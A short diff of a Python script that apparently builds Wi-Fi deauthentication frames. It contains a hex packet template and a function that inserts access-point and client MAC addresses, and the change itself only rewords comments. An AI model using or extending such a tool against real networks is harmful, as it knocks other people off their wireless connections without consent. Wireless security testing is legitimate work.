@@ -22,15 +22,15 @@ from sys import argv
 deauth = '00000d00048002000200010000c0003a01{0}{1}{0}706a0100'
 
 
-# Removes colons from a MAC string, leaving a string of hex which is
-# easy to work with.
+
+# Remove colons from a MAC address, just leaving the hex string.
 
 def mac(string):
     return string.replace(':', str())
 
 
 
-# Constructs a deauthenticate packet with inserted WAP and STA MAC
+# Construct a deauthenticate packet with inserted WAP and STA MAC
 # addresses.
 
 def construct(wap, sta):
